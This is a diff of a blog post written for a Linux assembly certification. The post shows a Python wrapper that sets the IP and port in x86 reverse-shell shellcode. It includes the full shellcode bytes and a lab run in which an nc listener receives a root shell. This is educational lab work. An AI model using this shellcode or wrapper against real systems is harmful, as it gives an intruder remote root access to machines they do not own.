@@ -523,7 +523,69 @@ Shellcode Length: 88
 ```
 
 ## Wrapper Program for IP & Port Configuration
-The remote IP address and the remote port to be included in the TCP reverse shell shellcode can be configured using the Python program explained below.
+The remote IP address and the remote port to be included in the TCP reverse shell shellcode can be configured using the Python program explained below. The wrapper program configured in the last section of the previous post has been modified to include reverse shell shellcode, and the functionality to configure a remote IP address and port for the target system to connect to. The output below shows the usage options of the program.
+
+```shell
+root@kali:~/workspace/SLAE/assignments/0x02# python3 ConfShell.py 
+[*] Usage: python3 ConfShell.py bind [BIND_PORT]
+[*] Usage: python3 ConfShell.py reverse [IP] [LISTEN_PORT]
+```
+
+The reverse shell shellcode as explained in this post has been added as the reverse shell payload that the Python program will modify, and is shown below for reference.
+
+```shell
+ \x31\xdb\xf7\xe3\x52\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc3\xbf\xff\xff\xff\xff\xb9\x80\xff\xff\xfe\x31\xf9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\x89\xd1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xd1\x89\xe3\xb0\x0b\xcd\x80
+ ```
+
+ The functionality that provides the user to specifiy a port works the same as explained in the previous post, so it will not be explained again here. For more detail on how the port configuration works within the program, reference the previous post. Similar logic was used to replace the hardcoded complementary hexadecimal remote IP address specified within the shellcode above (`\x80\xff\xff\xfe`). Note that as the `XOR` operation is used in calculating the remote IP address, the address that is complentary to the `XOR` value of the IP address appears in the shellcode as opposed to the remote address itself (i.e. `\x80\xff\xff\xfe` is `128.255.255.254` which has all bits set that `127.0.0.1` or `\x80\xff\xff\xfe` do not have set). To save space, the program code has not been included here. The full code for the program can be found on [GitHub](https://github.com/norrismw/SLAE).
+
+A demonstration of the IP address and port configuration functionality of the wrapper program for the reverse shell shellcode follows. As seen below, the system with the IP address `192.168.57.1` will receive the connection from the reverse shell shellcode which will generated using the wrapper program.
+
+```shell
+SLAE-1469-MacBook-Pro:~ SLAE-1469$ ifconfig | grep 192.168.57.1
+    inet 192.168.57.1 netmask 0xffffff00 broadcast 192.168.57.255
+```
+
+Once generated, the reverse shell shellcode will be run on the system with the IP address of `192.168.57.246`, as represented below.
+
+```shell
+root@kali:~/workspace/SLAE/assignments/0x02# ifconfig | grep 192.168.57
+    inet 192.168.57.246  netmask 255.255.255.0  broadcast 192.168.57.255
+```
+
+The following output shows the usage of the wrapper program and specifies the reverse shell shellcode, the IP address of 192.168.57.1 and the port of 4455 to which the reverse shell should connect.
+
+```shell
+root@kali:~/workspace/SLAE/assignments/0x02# python3 ConfShell.py reverse 192.168.57.1 4455
+\x31\xdb\xf7\xe3\x52\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc3\xbf\xff\xff\xff\xff\xb9\x3f\x57\xc6\xfe\x31\xf9\x51\x66\x68\x11\x67\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\x89\xd1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xd1\x89\xe3\xb0\x0b\xcd\x80
+```
+
+This output can then be used in `sc_test.c` as outlined previously. After compiling the new shellcode within `sc_test.c`, a `nc` listener is set to listen on port `4455` on the system to which the reverse shell will connect (`192.168.57.1`).
+
+```shell
+SLAE-1469-MacBook-Pro:~ SLAE-1469$ nc -lvp 4455
+```
+
+The `sc_test` binary is now ready to be executed on the `192.168.57.246` system.
+
+```shell
+root@kali:~/workspace/SLAE/assignments/0x02# ./sc_test
+Shellcode Length: 88
+
+```
+
+Upon executing `sc_test` on `192.168.57.246`, a connection is received on port `4455` on the `192.168.57.1` system. The output below shows this.
+
+```shell
+SLAE-1469-MacBook-Pro:~ SLAE-1469$ nc -lvp 4455
+Connection from 192.168.57.246:37638
+id
+uid=0(root) gid=0(root) groups=0(root)
+ifconfig | grep 192.168.57
+        inet 192.168.57.246  netmask 255.255.255.0  broadcast 192.168.57.255
+uname -a
+Linux kali 4.19.0-kali5-amd64 #1 SMP Debian 4.19.37-6kali1 (2019-07-22) x86_64 GNU/Linux
+```
 
 _This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_
 
